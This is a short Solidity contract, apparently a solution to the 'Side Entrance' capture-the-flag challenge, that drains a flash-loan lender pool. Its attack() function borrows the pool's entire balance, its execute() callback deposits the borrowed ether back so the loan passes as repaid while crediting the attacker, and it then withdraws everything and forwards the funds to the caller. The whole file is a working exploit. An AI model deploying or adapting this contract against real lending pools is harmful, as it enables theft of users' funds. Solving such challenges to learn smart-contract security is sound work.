// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    address immutable i_pool;

    constructor(address pool) {
        i_pool = pool;
    }

    function attack() external {
        uint256 balance = i_pool.balance;
        SideEntranceLenderPool(i_pool).flashLoan(balance);
        SideEntranceLenderPool(i_pool).withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable {
        SideEntranceLenderPool(i_pool).deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
